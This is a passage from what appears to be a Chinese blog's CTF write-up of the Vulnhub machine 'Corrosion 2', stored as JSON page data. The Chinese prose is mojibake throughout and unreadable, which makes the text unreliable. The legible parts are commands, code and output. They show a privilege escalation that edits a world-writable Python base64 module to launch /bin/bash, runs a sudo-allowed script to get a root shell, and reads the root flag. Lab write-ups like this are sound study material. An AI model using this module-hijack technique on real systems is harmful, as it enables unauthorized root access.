randombase64.py\n</code></pre>\n<p>ä¸èƒ½ç›´æ¥å†™å…¥å‘½ä»¤</p>\n</li>\n<li>\n<p>æˆ‘ä»¬çŸ¥é“å®ƒä½¿ç”¨äº†base64æ¨¡å—ï¼Œæˆ‘ä»¬ç›´æ¥å»ä¿®æ”¹base64æ¨¡å—</p>\n<pre><code class=\"hljs language-python\">randy@corrosion:~$ ls -al /usr/lib/python3<span class=\"hljs-number\">.8</span>/base64.py \n-rwxrwxrwx <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">20386</span> Sep <span class=\"hljs-number\">20</span>  <span class=\"hljs-number\">2021</span> /usr/lib/python3<span class=\"hljs-number\">.8</span>/base64.py\n</code></pre>\n<p>åˆšå¥½ä¹Ÿæ‹¥æœ‰æƒé™ï¼Œä¿®æ”¹æ–‡ä»¶</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># nano /usr/lib/python3.8/base64.py</span>\n<span class=\"hljs-keyword\">import</span> os\n....\n<span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">b64encode</span>(<span class=\"hljs-params\">s, altchars=<span class=\"hljs-literal\">None</span></span>):\n    os.system(<span class=\"hljs-string\">\"/bin/bash\"</span>)\n</code></pre>\n<p>éœ€è¦å†™åœ¨<code>b64encode</code> å‡½æ•°é‡Œè¾¹æ˜¯å› ä¸ºå®ƒæ–‡ä»¶ï¼ˆ<code>randombase64.py</code>ï¼‰é‡Œé¢è°ƒç”¨äº†è¯¥å‡½æ•°</p>\n</li>\n<li>\n<p>æ‰§è¡Œæ–‡ä»¶<code>randombase64.py</code></p>\n<pre><code class=\"hljs language-python\">randy@corrosion:~$ sudo /usr/<span class=\"hljs-built_in\">bin</span>/python3<span class=\"hljs-number\">.8</span> /home/randy/randombase64.py\nEnter your string: <span class=\"hljs-number\">1</span>\nroot@corrosion:/home/randy<span class=\"hljs-comment\"># </span>\n</code></pre>\n<p>è·å¾—rootç”¨æˆ·ï¼ï¼ï¼</p>\n</li>\n<li>\n<p>è¯»å–<code>flag</code>æ–‡ä»¶</p>\n<pre><code class=\"hljs language-python\">root@corrosion:~<span class=\"hljs-comment\"># cat root.txt</span>\n2fdbf8d4f894292361d6c72c8e833a4b\n</code></pre>\n</li>\n</ol>\n<h2>æ€»ç»“</h2>\n<p>å­¦åˆ°tomcatåå°ææƒæ–¹æ³•ï¼Œå…¶å®ä¸æ­¢ä¸Šä¼ waræ–¹æ³•ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨MSFï¼Œä¸è¿‡ä½¿ç”¨æ–¹æ³•æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯æ–¹ä¾¿</p>\n<p>ä»¥åŠææƒï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨lookæ¥è¯»å–rootçš„flagæ–‡ä»¶çš„ï¼Œå¹¶ä¸”åœ¨layeç”¨æˆ·ä¹Ÿå¯ä»¥ä½¿ç”¨**<code>polkit-agent-helper-1</code>** æ¥ææƒçš„ï¼Œä¸è¿‡æ‹¿åˆ°rootæƒé™ä¸æ˜¯æ›´å¥½å—</p>","title":"Vulnhub - Corrosion 2","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"é¶æœº","description":"Corrosion: 2\n\n https://www.vulnhub.com/entry/corrosion-2,745/\n \n\næç¤ºï¼šæšä¸¾æ‰æ˜¯ç¥\n\nä¸»æœºå‘ç°ç«¯å£æ‰«æ\n\n1. ä½¿ç”¨nmapæ‰«æç½‘æ®µç±»å­˜æ´»ä¸»æœº\n    \n    å› ä¸ºé¶æœºæ˜¯æˆ‘æœ€åæ·»åŠ çš„ï¼Œæ‰€ä»¥é¶æœºIPæ˜¯`6` ï¼Œ`kali`æ˜¯`10`\n    \n    \n    \n2. æ‰«æä¸»æœºå¼€æ”¾ç«¯å£\n    \n    \n    \n3. æ‰«æä¸»æœºæœåŠ¡..."},"recentPosts":[{"id":"TheHackersLabsNodeCeption","title":"TheHackersLabs - NodeCeption","date":"2025-07-25","isEncrypted":false,"year":"2025","month":"07","day":"25"},{"id":"TheHackersLabsPildoritas","title":"TheHackersLabs - Pildoritas","date":"2025-07-24","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"TheHackersLabsMentallity","title":"TheHackersLabs - Mentallity","date":"2025-07-23","isEncrypted":false,"year":"2025","month":"07","day":"23"},{"id":"HackTheBoxSeason8 - Mirage","title":"HackTheBox - Season8 - Mirage","date":"2025-07-22","isEncrypted":true,"year":"2025","month":"07","day":"22"},{"id":"TheHackersLabsCuriosity2","title":"TheHackersLabs - Curiosity2","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsCuriosity","title":"TheHackersLabs - Curiosity","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsB I G","title":"TheHackersLabs - B.I.G","date":"2025-07-18","isEncrypted":false,"year":"2025","month":"07","day":"18"}]},"__N_SSG":true}